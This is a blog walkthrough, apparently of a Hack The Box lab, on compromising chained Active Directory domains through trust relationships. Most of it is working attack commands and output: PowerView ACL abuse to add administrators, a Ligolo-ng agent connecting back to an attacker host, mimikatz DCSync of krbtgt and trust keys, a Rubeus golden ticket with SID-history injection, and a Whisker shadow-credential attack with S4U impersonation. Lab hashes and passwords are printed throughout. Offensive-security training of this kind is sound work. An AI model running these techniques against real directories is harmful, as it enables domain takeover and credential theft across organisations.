---
title: "Breaking Active Directory Trusts"
categories:
    - blog
tags:
    - Windows
    - Active Directory
---

## Why Trusts?

Active Directory (AD) is a key solution for organizations to manage identities, access control, domain administration, and authentication. A key feature of AD is the ability to connect domains and forests using "trusts." These domain trusts enable resource sharing, centralized management, cross-forest collaboration, and migrations.

### Types of Trusts:
1. **Intra-trust:**
   - **Parent-Child:** Created automatically between a parent domain and its child domain within the same forest. It is transitive by default, meaning the trust relationship extends through the hierarchy to other domains.
   - **Tree-Root:** Also transitive and established between the root domain of a tree and the root domain of another tree within the same forest.

2. **Cross-trust:**
   - **External Trust:** A manually created trust between domains in different forests. It is *non-transitive*, meaning the trust is limited to the two specific domains.
   - **Forest Trust:** Established between two forest root domains, allowing transitive access to all domains within each forest.
   - **Shortcut (or Cross-Link) Trust:** A *transitive* trust created between two domains within the same forest to improve resource access time and reduce authentication paths.

### Transitivity:
- **Transitive Trusts:** Trusts that automatically extend to other domains in the same forest or trusted domain trees, allowing users in one domain to access resources in multiple domains without additional trusts. Examples include Parent-Child, Tree-Root, and Forest trusts.
- **Non-Transitive Trusts:** Trusts that apply only between two specific domains and do not extend beyond them. This is typical of External trusts.

### Trust Directions:  
Trusts can be either *one-way* or *two-way*. 

- **Outbound Trust:** In an outbound trust, the trusting domain allows users from the trusted domain to access its resources. 
- **Inbound Trust:** In an inbound trust, the trusted domain can access resources in the trusting domain.

### Trust Direction vs. Access Direction:
Trust direction refers to which domain grants access, while access direction is the reverse. For example, if Domain A has an outbound trust to Domain B, then Domain A trusts Domain B, and users in Domain B can access resources in Domain A (inbound access). Conversely, Domain B does not automatically grant access to Domain A unless a reverse trust is set up.


## Enumeration
### Skipping Trust Enumeration: Focus on Abuse Techniques

While trust enumeration is an important step in understanding the relationships between domains and forests, it doesn't require much beyond the basics described earlier. Tools like `nltest`, PowerView, and native PowerShell commands make it easy to gather this information.

### Trust Enumeration:
```
//Get Forest Object
  Get-NetForest [-Forest megacorp.local]
  Get-Forest [-Forest megacorp.local]
  
//Get All Domains in a Forest
  Get-NetForestDomain [-Forest megacorp.local]
  Get-ForestDomain [-Forest megacorp.local]
  
//Enumerate Trusts via NLTest & .NET
    nltest /trusted_domains /v // cmd.exe
    ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
    ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
  
//Enumerate Trusts via Win32 API and LDAP
  Get-NetDomainTrust [-Domain megacorp.local] | ft
  Get-DomainTrust -API [-Domain megacorp.local] | ft
  
//Build Domain Trust Mapping
  Invoke-MapDomainTrust [-Domain megacorp.local] | ft
  Get-DomainTrustMapping [-Domain megacorp.local] | ft
```
* [PowerView](https://github.com/RedTeamMagic/Powershell/blob/main/PowerView.ps1)

### Why Skip Enumeration?

Since trust enumeration is straightforward and can be easily performed using the commands listed above, we'll skip this phase and focus on **abuse techniques** instead. Once trusts have been enumerated, abusing them effectively requires more advanced techniques, which we'll cover next.

## Abusing trust

The image shows a chain of trusts between multiple Active Directory domains and forests. In our scenario, we have been provided with a low-privilege account in one of the domains. However, through trust abuse techniques, we can escalate privileges and take over all domains that have established trust relationships.

![trust_maping](/assets/images/posts/Trusts_htb/trust_maping.png)

### Parent-child trust

In our scenario, we are assuming an assessment context where we are provided with low-privilege access in a child domain. The initial focus will be on exploring potential abuses related to the parent-child domain trust.

![alt text](/assets/images/posts/Trusts_htb/bloodhound_child-dc.png)

Using BloodHound, we can observe that although the provided account does not have administrative privileges, it is a member of the `svc_admins` group. This group, which originates from the parent domain, has general administrative privileges across the domain. This situation suggests a potentially misconfigured discretionary access control list (DACL), which may grant more permissions than intended.

The attack path we have identified involves adding our user to the `Administrators` group in the child domain and then creating a new user in the parent domain. This new user can also be added to the `Administrators` group, thereby escalating our privileges in both domains.

#### Performing the attack
```
//adding our user into Administrators
PS C:\Users\Public> . .\PowerView.ps1
PS C:\Users\Public> hostname;whoami
CHILD-DC
child\htb-student
PS C:\Users\Public> Add-DomainGroupMember -identity 'Administrators' -Members 'child\htb-student' -Domain inlanefreight.ad -Verbose
VERBOSE: [Get-PrincipalContext] Binding to domain 'inlanefreight.ad'
VERBOSE: [Get-PrincipalContext] Binding to domain 'child.inlanefreight.ad'
VERBOSE: [Add-DomainGroupMember] Adding member 'child\htb-student' to group 'Administrators'

//create new user
PS C:\Users\Public> $SecPassword = ConvertTo-SecureString 'T3st@123' -AsPlainText -Force
PS C:\Users\Public> New-DomainUser -Domain inlanefreight.ad -SamAccountName Freak -AccountPassword $SecPassword
PS C:\Users\Public> Add-DomainGroupMember -identity 'Administrators' -Members 'Freak' -Domain inlanefreight.ad -Verbose
VERBOSE: [Get-PrincipalContext] Binding to domain 'inlanefreight.ad'
VERBOSE: [Add-DomainGroupMember] Adding member 'Freak' to group 'Administrators'
```
In our scenario extra step needed, we need to use [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) because only the child domain is accessible via VPN, while the other domains are on an internal interface.
 

```
//uploading ligolo agent into victim machine
PS C:\Users\Public> .\vhosts.exe -connect 10.10.15.233:11601 -retry -ignore-cert
time="2024-09-12T17:41:44-05:00" level=warning msg="warning, certificate validation disabled"
time="2024-09-12T17:41:44-05:00" level=info msg="Connection established" addr="10.10.15.233:11601"
```

We got connection into our machine wish it attacker machine 
```
//ligolo attacker machine
[Agent : CHILD\htb-student@CHILD-DC] » INFO[2123] Agent joined.
name="CHILD\\htb-student@CHILD-DC" remote="10.129.229.201:52521"

ligolo-ng » interface_list
┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Available tuntaps                                                                                  │
├───┬──────────┬─────────────────────────────────────────────────────────────────────────────────────┤
│ # │ TAP NAME │ DST ROUTES                                                                          │
├───┼──────────┼─────────────────────────────────────────────────────────────────────────────────────┤
│ 0 │ notedice │ fe80::/64,172.16.114.0/24                                                           │
│ 1 │ tun0     │ fe80::/64,10.10.10.0/23,10.10.14.0/23,10.129.0.0/16,dead:beef::/64,dead:beef:2::/64 │
└───┴──────────┴─────────────────────────────────────────────────────────────────────────────────────┘
```

Lets verify that we have access using the user we create previously 

```

[Sep 12, 2024 - 18:47:18 (EDT)] exegol-academy /workspace # nxc rdp "172.16.114.3" -u 'Freak' -p 'T3st@123'
RDP         172.16.114.3    3389   DC               [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC) (domain:inlanefreight.ad) (nla:True)
RDP         172.16.114.3    3389   DC               [+] inlanefreight.ad\Freak:T3st@123 (admin)

PS C:\Users\Freak> whoami;hostname
inlanefreight\freak
DC
```

By exploiting the misconfigured ACL, we have escalated our privileges to the administrator level in the parent domain. Creating a new account, however, is not optimal for evading detection (opsec) and should be avoided.

### Forest trust
We can verify that there is a forest trust with `apexcargo.ad`, which is a two-way trust:

![Forest Trust](assets/images/posts/Trusts_htb/Forest_trust.jpg)

Additionally, there is a group with a RID greater than 1000, which is suitable for SID history injection. This is useful because RID values less than 1000 are filtered by default in forest trusts.
[How does SID filtering work?](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)

![group-rid](/assets/images/posts/Trusts_htb/group-rid.jpg)
And our selected group have the right to Dcsync with is great for us.
![hr_managment](/assets/images/posts/Trusts_htb/hr_managment.png)

#### Performing the attack

```
// domain sid
*Evil-WinRM* PS C:\Users\Freak\Desktop> . .\PowerView.ps1
*Evil-WinRM* PS C:\Users\Freak\Desktop> Get-DomainSID
S-1-5-21-1407615112-106284543-3058975305

// krbtgt hash
*Evil-WinRM* PS C:\Users\Freak\Desktop>  .\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\krbtgt" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:INLANEFREIGHT\krbtgt
[DC] 'inlanefreight.ad' will be the domain
[DC] 'DC.inlanefreight.ad' will be the DC server
[DC] 'INLANEFREIGHT\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/30/2024 10:42:23 PM
Object Security ID   : S-1-5-21-1407615112-106284543-3058975305-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 6f639a6054a3d9852409e9ad7e41893b
    ntlm- 0: 6f639a6054a3d9852409e9ad7e41893b
    lm  - 0: 27d88160e6b172196deac2bb5205e74c

//group sid
PS C:\Users\Freak\Desktop> Get-ADGroup -Identity "HR_MANAGEMENT" -Server "apexcargo.ad"
DistinguishedName : CN=HR_Management,CN=Users,DC=apexcargo,DC=ad
GroupCategory     : Security
GroupScope        : Universal 
ObjectClass       : group
ObjectGUID        : d3a49e61-3516-4708-b3af-9c0f98ee1778                                                                          
SamAccountName    : HR_Management                                                                                                 
SID               : S-1-5-21-990245489-431684941-3923950027-1112  
```
We currently have the following requirements for the SID history attack:

- **Current Domain SID**: `S-1-5-21-1407615112-106284543-3058975305`
- **KRBTGT Hash**: `6f639a6054a3d9852409e9ad7e41893b`
- **Group SID**: `S-1-5-21-990245489-431684941-3923950027-1112`

```
*Evil-WinRM* PS C:\Users\Freak\Desktop> .\Rubeus.exe golden /rc4:6f639a6054a3d9852409e9ad7e41893b /domain:inlanefreight.ad /sid:S-1-5-21-1407615112-106284543-3058975305 /sids:S-1-5-21-990245489-431684941-392
3950027-1112 /user:Administrator /ptt

*Evil-WinRM* PS C:\Users\Freak\Desktop> klist

Current LogonId is 0:0x1abf4e

Cached Tickets: (1)

#0>     Client: Administrator @ INLANEFREIGHT.AD
        Server: krbtgt/inlanefreight.ad @ INLANEFREIGHT.AD
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 9/13/2024 21:27:11 (local)
        End Time:   9/14/2024 7:27:11 (local)
        Renew Time: 9/20/2024 21:27:11 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

PS C:\Users\Freak\Desktop> .\mimikatz.exe "lsadump::dcsync /domain:apexcargo.ad /user:Administrator"                                                                                                                 
SAM Username         : Administrator                                                                                              
Account Type         : 30000000 ( USER_OBJECT )                                                                                   
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )                                                             
Account expiration   :                                                                                                            
Password last change : 4/6/2024 5:40:03 PM                                                                                        
Object Security ID   : S-1-5-21-990245489-431684941-3923950027-500                                                                
Object Relative ID   : 500                                                                                                                                                                                                                                          Credentials:                                                                                                                        
Hash NTLM: 2cd9f13c4aa3b468308525a93696e5a1                                                                                         
ntlm- 0: 2cd9f13c4aa3b468308525a93696e5a1                                                                                         
ntlm- 1: 64cbb76dcafe2e977794f6251f8231fb                                                                                         
lm  - 0: 75e0a5932306d3a73e6d77db9b10f853                                                                                     
```

**Success!** We have successfully moved from the child domain to the parent domain and then to the trusted domain.

```
[Sep 13, 2024 - 22:38:15 (EDT)] exegol-academy /workspace # evil-winrm -i 172.16.114.10 -u Administrator -H 2cd9f13c4aa3b468308525a93696e5a1

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami;hostname
apexcargo\administrator
DC03
```
### Trust Account

In this case, we have a great example to explore trust direction. Specifically, we have an outbound trust, which means that our compromised domain is the trusting domain. Consequently, we cannot enumerate or access resources in the trusted domain from our domain.

```
*Evil-WinRM* PS C:\Users\freak\Desktop>  Invoke-MapDomainTrust


SourceName      : apexcargo.ad
TargetName      : inlanefreight.ad
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 4/1/2024 3:53:05 PM
WhenChanged     : 9/14/2024 1:31:16 AM

SourceName      : apexcargo.ad
TargetName      : mssp.ad
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 4/1/2024 5:49:07 PM
WhenChanged     : 9/14/2024 1:31:16 AM
```


[But can we bypass it?](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-trust-accountusd-accessing-resources-on-a-trusted-domain-from-a-trusting-domain) This is where the [trust account](https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-1-the-mechanics/) comes into play.

```
*Evil-WinRM* PS C:\Users\freak\Desktop> .\SharpHound.exe -c All -d mssp.ad
2024-09-13T22:20:57.7224740-05:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2024-09-13T22:20:57.8943545-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-09-13T22:20:57.9099743-05:00|INFORMATION|Initializing SharpHound at 10:20 PM on 9/13/2024
2024-09-13T22:20:57.9568500-05:00|ERROR|Unable to connect to LDAP, verify your credentials
```
As we can see from the output, we attempted to run SharpHound to collect BloodHound data for the `mssp.ad` domain. but it failed.

#### Performing the attack

```
*Evil-WinRM* PS C:\Users\freak\Desktop> ./mimikatz.exe "lsadump::trust /patch" exit
 [ Out ] MSSP.AD -> APEXCARGO.AD
    * 9/13/2024 8:31:16 PM - CLEAR   - d7 33 fd d4 af 9f 90 59 64 fa 57 e1 26 e6 a4 05 1d d7 c5 ae d6 06 13 b8 92 3c 09 8b ba b4 0f ea ac a1 42 26 ed 24 9c 7b c1 a8 24 ca 81 68 e3 b2 52 b5 e5 48 b5 c4 c2 a5 bb 5b 65 de 79 fe 2c 8d 44 32 be 30 8e 88 cc 25 44 34 04 74 74 12 8c e0 32 dd 15 b4 c8 82 73 4f d9 c8 83 96 47 c8 7e 92 0a 00 10 48 74 c4 4b 31 4a 4f 9d 00 94 89 f4 fb e7 b6 31 87 14 e6 3b a0 78 cb 76 52 00 e3 e5 c9 9f 23 cf 2a d5 d3 b2 fb 68 99 36 38 49 0f f0 5a fd d2 ba 6a e4 fd 60 70 32 ad 15 a7 bb 3a dd 8e 48 bd 28 07 e8 e3 c3 ff 97 7c 61 8b 90 45 40 11 3a d4 99 b4 14 1a b2 f3 45 e0 69 a6 d9 cd 0b dd 1e d7 87 29 da 57 04 67 97 5d 92 07 79 47 b9 db 9a 2b 1d b7 5e 55 d5 bb e3 2d 60 7d a7 34 fa 50 d7 99 7f ff 8f 03 91 bc 94 c5 24 a4 37 c9 04 f8
        * aes256_hmac       34065d2ac4681007159cc8e00bf20a094108d1dcedac9e30e87a10ab202b436c
        * aes128_hmac       ee7a9422591acf413183bbc69356e214
        * rc4_hmac_nt       caa876348a222d05f595aecd267d863c

 [ In-1] APEXCARGO.AD -> MSSP.AD

 [Out-1] MSSP.AD -> APEXCARGO.AD
    * 9/13/2024 8:31:16 PM - CLEAR   - 24 00 2e 00 38 00 45 00 52 00 43 00 62 00 29 00 34 00 2f 00 4f 00 5f 00 21 00 4a 00 74 00
        * aes256_hmac       1feaa6305dbfea6c9272453c5f2db9cde96fd785d302a4bf0a2e0782e86c7a49
        * aes128_hmac       fec8281e6115bda3350072195a94d2bf
        * rc4_hmac_nt       072f376106bee87ba2433ffc825af3e7

*Evil-WinRM* PS C:\Users\freak\Desktop>  .\Rubeus.exe asktgt /user:apexcargo$ /domain:mssp.ad /rc4:caa876348a222d05f595aecd267d863c /ptt
*Evil-WinRM* PS C:\Users\freak\Desktop> klist

Current LogonId is 0:0x26c921

Cached Tickets: (1)

#0>     Client: apexcargo$ @ MSSP.AD
        Server: krbtgt/mssp.ad @ MSSP.AD
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 9/13/2024 22:28:38 (local)
        End Time:   9/14/2024 8:28:38 (local)
        Renew Time: 9/20/2024 22:28:38 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
Let’s try again.

![We Got It](assets/images/posts/Trusts_htb/trust-key.png)

Success! We can now collect BloodHound data.  
![alt text](/assets/images/posts/Trusts_htb/mssp.ad.admin.png)


From bloodhound we can see that every domain user is admin in `mssp.ad` since we have `TGT` of trust account wish is also domain user we can DCsync `mssp.ad`
![alt text](/assets/images/posts/Trusts_htb/prove-any-user-admin.png)


Win after win!

```
[Sep 13, 2024 - 23:57:35 (EDT)] exegol-academy /workspace # evil-winrm -i 172.16.114.15 -u Administrator -H 26f4629cf04eedb53e34388a118e2d3e

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami;hostname
mssp\administrator
DC04

```
### Trust with DACL + Shadow Credentials

We are one step ahead of achieving full control over all the domains in the Active Directory.
In our last scenario, we have a user named `harry` in the compromised domain with "Generic All" permissions on the `alex` account. Additionally, the `alex` account, which is an Account Operator, has "Generic All" permissions on the `Enterprise Key Admins`. This configuration allows us to perform a [shadow credential attack](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials).



![alt text](/assets/images/posts/Trusts_htb/way-from-mssp-fabricorp.png)

![alt text](/assets/images/posts/Trusts_htb/alex-value.png)

#### Performing the Attack

Since we have admin rights, we first changed Harry's password and now proceed to change Alex's password by abusing ACLs:

```
# Changing Alex's password
PS C:\Users\harry\Desktop> . .\PowerView.ps1
PS C:\Users\harry\Desktop> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\Users\harry\Desktop> Set-DomainUserPassword -Identity alex -AccountPassword $UserPassword -Domain fabricorp.ad
```
```bash
# Adding Alex to the ENTERPRISE KEY ADMINS group
[Sep 15, 2024 - 06:56:43 (EDT)] exegol-academy /workspace # net rpc group addmem "ENTERPRISE KEY ADMINS" "Alex" -U "Fabricorp.ad"/"Alex"%'Password123!' -S "172.16.114.20"
```
We have now set up the requirements for a shadow credential attack.

Step 1: Obtain TGT

```
PS C:\Users\harry\Desktop> .\Rubeus.exe asktgt /user:Alex /password:Password123! /domain:fabricorp.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
[*] Building AS-REQ (w/ preauth) for: 'fabricorp.ad\Alex'
[*] Using domain controller: 172.16.114.20:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
```
Step 2: Generate and Update KeyCredential

```
PS C:\Users\harry\Desktop> .\Whisker.exe add /target:DC05$ /domain:fabricorp.ad /dc:DC05.fabricorp.ad
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password SFHFhtAc0h881hiS
[*] Searching for the target account
[*] Target user found: CN=DC05,OU=Domain Controllers,DC=fabricorp,DC=ad
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 68c4b593-c519-4ba6-bbbb-e677c2af41fe
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:DC05$ /certificate:<base64> /password:<Password> /domain:fabricorp.ad /dc:DC05.fabricorp.ad /getcredentials /show
```
Step 3: Retrieve Credentials
```
PS C:\Users\harry\Desktop> ./Rubeus.exe asktgt /user:DC05$ /certificate:<base64> /password:<Password> /domain:fabricorp.ad /dc:DC05.fabricorp.ad /getcredentials /show
```
Step 4: S4U2Porxy and S4U2Self
```
PS C:\Users\harry\Desktop> .\Rubeus.exe s4u /dc:DC05.fabricorp.ad  /impersonateuser:administrator@fabricorp.ad /ptt /self /service:host/DC05.fabricorp.ad /altservice:cifs/DC05.fabricorp.ad /ticket:<base64>
```
Step 5: Access the Admin Shares

```
PS C:\Users\harry\Desktop> ls //DC05.fabricorp.ad//c$


    Directory: \\DC05.fabricorp.ad\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         4/4/2024   6:56 AM                inetpub
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---         4/6/2024   5:30 PM                Program Files
d-----        9/15/2018   4:06 AM                Program Files (x86)
d-----        3/19/2022   5:56 AM                Temp
d-----         4/5/2024  10:18 AM                Tools
d-r---         4/4/2024   6:57 AM                Users
d-----         4/6/2024   5:46 PM                Windows
```

## Summary

### Abusing Trust

Exploiting AD trust relationships for access.

### Parent-Child Trust

Escalating privileges via parent-child domain trusts.

### Forest Trust

Expanding access across AD forests through forest trusts.

### Trust Account

Leveraging trust accounts to manage domain relationships.

### Trust with DACL + Shadow Credentials

Using ACL abuse and shadow credentials to gain elevated access.